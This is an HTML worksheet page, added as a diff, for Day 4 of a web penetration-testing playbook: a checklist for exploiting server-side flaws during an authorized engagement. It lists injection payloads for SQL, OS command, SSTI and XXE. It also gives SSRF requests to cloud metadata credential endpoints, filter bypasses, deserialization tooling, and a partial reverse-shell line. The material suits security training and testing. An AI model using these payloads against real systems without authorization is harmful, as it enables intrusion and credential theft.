@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Day 4 Worksheet — Server-Side Deep Dive. Interactive checklist for the fourth day of a 5-day web pentest engagement.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff6633' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../vulns/style.css">
+  <title>Day 4 Worksheet · Server-Side Deep Dive · Web Pentest Playbook</title>
+</head>
+<body data-day="day4" style="--day-color: var(--danger)">
+
+<svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <symbol id="icon-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-server" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></symbol>
+  </defs>
+</svg>
+
+<nav class="topnav" aria-label="Primary">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2026</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html#vulns" class="nav-link">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="../index.html#day4" class="nav-link active">Worksheets</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+  </div>
+  <div class="nav-right">
+    <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="nav-link" style="font-size:0.78rem;">GitHub</a>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle color theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="content-wrap" style="padding-top:2rem">
+
+  <div class="day-page-hero">
+    <div class="day-num">Worksheet · Day 4 of 5</div>
+    <h1>
+      <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-server"/></svg></span>
+      Server-Side Deep Dive
+    </h1>
+    <p>Pull the highest-impact leads from Days 2–3 and <strong>fully exploit them</strong>. Confirm, fingerprint, weaponize, document. This is the day critical findings get their POCs.</p>
+    <div class="day-progress">
+      <div class="day-progress-bar-wrap"><div class="day-progress-bar" style="width:0%"></div></div>
+      <div class="day-progress-text"><strong>0</strong> / 0 tasks · <strong>0%</strong> complete</div>
+      <div class="day-progress-saved"></div>
+    </div>
+  </div>
+
+  <section class="worksheet-section" id="leads">
+    <h2><span class="ws-section-num">1</span>Leads to Exploit Today</h2>
+    <p class="ws-intro">Pull the shortlist from Day-2 / Day-3 worksheets. Prioritize by impact: RCE &gt; data exfil &gt; auth bypass &gt; everything else.</p>
+    <div class="form-group">
+      <label for="t-priority">Priority queue (highest impact first)</label>
+      <textarea id="t-priority" data-key="text-priority" placeholder="1. SQLi at /search?q= (MySQL, error-based) — full DB access&#10;2. CMDi at /api/ping?host= — RCE candidate&#10;3. SSRF at /api/preview?url= — cloud metadata"></textarea>
+    </div>
+  </section>
+
+  <section class="worksheet-section" id="sqli">
+    <h2><span class="ws-section-num">2</span>SQL Injection</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-sqli-confirm"><span class="task-label">Confirm injection: <code>' OR 1=1--</code> · <code>" OR 1=1--</code> · numeric <code>1 OR 1=1</code> · time-based <code>1; SELECT SLEEP(5)--</code></span></li>
+      <li><input type="checkbox" data-key="check-sqli-context"><span class="task-label">Identify injection context: string vs numeric, single vs double quote, after WHERE/ORDER BY</span></li>
+      <li><input type="checkbox" data-key="check-sqli-fingerprint"><span class="task-label">DB fingerprint: <code>@@version</code> (MSSQL) · <code>version()</code> (MySQL/Postgres) · <code>banner</code> (Oracle)</span></li>
+      <li><input type="checkbox" data-key="check-sqli-columns"><span class="task-label">Column count: <code>ORDER BY 1, 2, 3,...</code> until error</span></li>
+      <li><input type="checkbox" data-key="check-sqli-union"><span class="task-label">UNION extraction: <code>UNION SELECT NULL, table_name, NULL FROM information_schema.tables</code></span></li>
+      <li><input type="checkbox" data-key="check-sqli-blind"><span class="task-label">Blind: boolean diff (<code>AND 1=1</code> vs <code>AND 1=2</code>) or time-based (<code>SLEEP(5)</code>)</span></li>
+      <li><input type="checkbox" data-key="check-sqli-oob"><span class="task-label">OOB exfil (no response): <code>LOAD_FILE</code> + DNS callback to Collaborator/oastify</span></li>
+      <li><input type="checkbox" data-key="check-sqli-creds"><span class="task-label">Extract credentials table — usernames + password hashes</span></li>
+      <li><input type="checkbox" data-key="check-sqli-2nd"><span class="task-label">Second-order: payload stored in DB, fires on later read (e.g., username field)</span></li>
+      <li><input type="checkbox" data-key="check-sqli-sqlmap"><span class="task-label">Confirm with sqlmap: <code>sqlmap -r req.txt --batch --risk=3 --level=5 --dbs</code></span></li>
+      <li><input type="checkbox" data-key="check-sqli-poc"><span class="task-label">POC complete: minimal request, response showing extracted data, screenshot</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="cmdi">
+    <h2><span class="ws-section-num">3</span>OS Command Injection</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-cmdi-confirm"><span class="task-label">Confirm: <code>; sleep 5</code>, <code>| sleep 5</code>, <code>&amp; ping -c 5 collab</code>, <code>$(sleep 5)</code>, backticks</span></li>
+      <li><input type="checkbox" data-key="check-cmdi-context"><span class="task-label">Identify injection context: shell command-line, eval(), exec(), system()</span></li>
+      <li><input type="checkbox" data-key="check-cmdi-blind"><span class="task-label">Blind via OAST: <code>; nslookup unique.collaborator.host</code> — DNS hit?</span></li>
+      <li><input type="checkbox" data-key="check-cmdi-output"><span class="task-label">Capture output: <code>; id; whoami; uname -a</code> — what user, what platform?</span></li>
+      <li><input type="checkbox" data-key="check-cmdi-filter"><span class="task-label">Bypass filters: <code>${IFS}</code> for spaces, <code>'who'ami</code>, <code>$@</code> tricks</span></li>
+      <li><input type="checkbox" data-key="check-cmdi-sudo"><span class="task-label">Privilege check: <code>sudo -l</code>, <code>id</code>, <code>cat /etc/passwd</code></span></li>
+      <li><input type="checkbox" data-key="check-cmdi-pivot"><span class="task-label">Pivot reachability: <code>nc -zv internal-host 22 80 443</code></span></li>
+      <li><input type="checkbox" data-key="check-cmdi-shell"><span class="task-label">Reverse shell (only if explicitly authorized): <code>bash -i &gt;&amp; /dev/tcp/...</code></span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="ssrf">
+    <h2><span class="ws-section-num">4</span>SSRF</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-ssrf-confirm"><span class="task-label">Confirm: point at Collaborator/oastify URL — DNS+HTTP hit?</span></li>
+      <li><input type="checkbox" data-key="check-ssrf-localhost"><span class="task-label"><code>http://127.0.0.1</code>, <code>http://localhost</code>, <code>http://0.0.0.0</code>, <code>http://[::1]</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-aws"><span class="task-label">AWS metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-aws-imdsv2"><span class="task-label">If IMDSv2: try <code>X-aws-ec2-metadata-token</code> header forging</span></li>
+      <li><input type="checkbox" data-key="check-ssrf-gcp"><span class="task-label">GCP metadata: <code>http://metadata.google.internal/computeMetadata/v1/?recursive=true</code> with <code>Metadata-Flavor: Google</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-azure"><span class="task-label">Azure: <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> with <code>Metadata: true</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-bypass"><span class="task-label">Bypass filters: decimal IP <code>2130706433</code>, hex <code>0x7f000001</code>, <code>127.1</code>, <code>[::ffff:127.0.0.1]</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-redirect"><span class="task-label">Open-redirect chain: app fetches attacker-controlled URL that 302s to <code>169.254.169.254</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-protocol"><span class="task-label">Protocol smuggling: <code>gopher://</code>, <code>file://</code>, <code>dict://</code>, <code>ftp://</code></span></li>
+      <li><input type="checkbox" data-key="check-ssrf-portscan"><span class="task-label">Internal port scan: time-based diff on closed vs open ports</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="ssti">
+    <h2><span class="ws-section-num">5</span>SSTI</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-ssti-confirm"><span class="task-label">Confirm: <code>{{7*7}}</code>, <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code> — <code>49</code> in response?</span></li>
+      <li><input type="checkbox" data-key="check-ssti-fingerprint"><span class="task-label">Engine fingerprint: Jinja2 <code>{{7*'7'}}</code>=7777777, Twig=49 string, Smarty=49</span></li>
+      <li><input type="checkbox" data-key="check-ssti-sandbox"><span class="task-label">Sandbox escape (Jinja2): <code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code></span></li>
+      <li><input type="checkbox" data-key="check-ssti-rce"><span class="task-label">RCE chain: full payload that runs <code>id</code> or pings Collaborator</span></li>
+      <li><input type="checkbox" data-key="check-ssti-csti"><span class="task-label">If client-side template (AngularJS/Vue): CSTI via <code>{{constructor.constructor('alert(1)')()}}</code></span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="xxe-deser">
+    <h2><span class="ws-section-num">6</span>XXE / Deserialization / Race</h2>
+    <p class="ws-intro">Often need only one of these — pick the highest-impact lead first.</p>
+    <ul class="task-list">
+      <li class="task-group-title">XXE</li>
+      <li><input type="checkbox" data-key="check-xxe-classic"><span class="task-label">Classic: <code>&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></span></li>
+      <li><input type="checkbox" data-key="check-xxe-blind"><span class="task-label">Blind XXE OOB via DTD: <code>SYSTEM "http://collab/x.dtd"</code></span></li>
+      <li><input type="checkbox" data-key="check-xxe-ssrf"><span class="task-label">XXE → SSRF: <code>SYSTEM "http://169.254.169.254/..."</code></span></li>
+      <li class="task-group-title">Deserialization</li>
+      <li><input type="checkbox" data-key="check-deser-fingerprint"><span class="task-label">Identify format: Java <code>rO0AB</code>, .NET ViewState, PHP <code>O:</code>, Python <code>gASV</code>, Ruby <code>BAh</code></span></li>
+      <li><input type="checkbox" data-key="check-deser-payload"><span class="task-label">Generate gadget chain: <code>ysoserial</code> (Java), <code>phpggc</code> (PHP), <code>pickle.dumps</code> (Python)</span></li>
+      <li><input type="checkbox" data-key="check-deser-confirm"><span class="task-label">Confirm RCE via DNS callback (URLDNS for Java) before going for full RCE</span></li>
+      <li class="task-group-title">Race conditions</li>
+      <li><input type="checkbox" data-key="check-race-find"><span class="task-label">Identify race window: any "check then act" — purchase, transfer, vote, MFA attempts</span></li>
+      <li><input type="checkbox" data-key="check-race-burp"><span class="task-label">Burp Repeater "Send group in parallel" or Turbo Intruder script — 30+ requests</span></li>
+      <li><input type="checkbox" data-key="check-race-confirm"><span class="task-label">Confirm anomaly: e.g., coupon used twice, balance went negative, reward issued multiple times</span></li>
+    </ul>
+  </section>
+
+  <section class="worksheet-section" id="poc">
+    <h2><span class="ws-section-num">7</span>POC Documentation</h2>
+    <p class="ws-intro">For every confirmed bug — document NOW while context is fresh.</p>
+    <div class="form-group">
+      <label for="t-poc">POCs (per finding)</label>
+      <textarea id="t-poc" data-key="text-poc" placeholder="### SQLi at /search?q=&#10;Request: GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1&#10;Response: rows leaked, screenshot saved.&#10;Impact: full DB read, credentials extracted&#10;CVSS: 9.8 (Critical)&#10;&#10;### CMDi at /api/ping?host=&#10;..."></textarea>
+    </div>
+  </section>
+
+  <section class="worksheet-section" id="eod">
+    <h2><span class="ws-section-num">✓</span>End of Day Checklist</h2>
+    <ul class="task-list">
+      <li><input type="checkbox" data-key="check-eod-poc"><span class="task-label">Working POC for every confirmed finding (request + response + impact)</span></li>
+      <li><input type="checkbox" data-key="check-eod-screenshots"><span class="task-label">Screenshots captured for the report</span></li>
+      <li><input type="checkbox" data-key="check-eod-cvss"><span class="task-label">CVSS / severity rated for each finding</span></li>
+      <li><input type="checkbox" data-key="check-eod-burp"><span class="task-label">Burp project file saved with descriptive name</span></li>
+      <li><input type="checkbox" data-key="check-eod-iron"><span class="task-label"><strong>Iron Rule:</strong> stopped chasing variations once a working exploit was confirmed; time-boxed each lead</span></li>
+    </ul>
+
+    <div class="day-actions">
+      <button id="day-export" type="button">📄 Export as text</button>
+      <button id="day-reset" type="button" class="danger">↺ Reset Day 4 progress</button>
+    </div>
+  </section>
+
+  <nav class="day-nav-buttons" aria-label="Day navigation">
+    <a href="day3.html" class="prev">
+      <span class="nav-label">← Previous</span>
+      <span class="nav-title">Day 3 · File / Client</span>
+    </a>
+    <a href="day5.html" class="next">
+      <span class="nav-label">Next worksheet →</span>
+      <span class="nav-title">Day 5 · Client + Close</span>
+    </a>
+  </nav>
+
+</div>
+
+<footer class="home-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-brand-link">
+          <div class="logo-icon"><svg class="icon" aria-hidden="true"><use href="#icon-shield"/></svg></div>
+          <span class="footer-brand-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Worksheets</div>
+        <a href="day1.html">Day 1 · Recon</a>
+        <a href="day2.html">Day 2 · Auth + Probes</a>
+        <a href="day3.html">Day 3 · File / Client</a>
+        <a href="day4.html">Day 4 · Server-Side</a>
+        <a href="day5.html">Day 5 · Client + Close</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html">5-Day Playbook</a>
+        <a href="../index.html">All Vulnerabilities</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom-row">
+      <span>© 2026 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by Tomer Hadad</span>
+    </div>
+  </div>
+</footer>
+
+<script src="dayform.js"></script>
+<script>
+  (function(){
+    var t = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+    var btn = document.getElementById('theme-toggle');
+    if(btn){
+      btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+      btn.addEventListener('click', function(){
+        var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        document.documentElement.setAttribute('data-theme', n);
+        localStorage.setItem('theme', n);
+        btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+      });
+    }
+  })();
+</script>
+
+</body>
+</html>
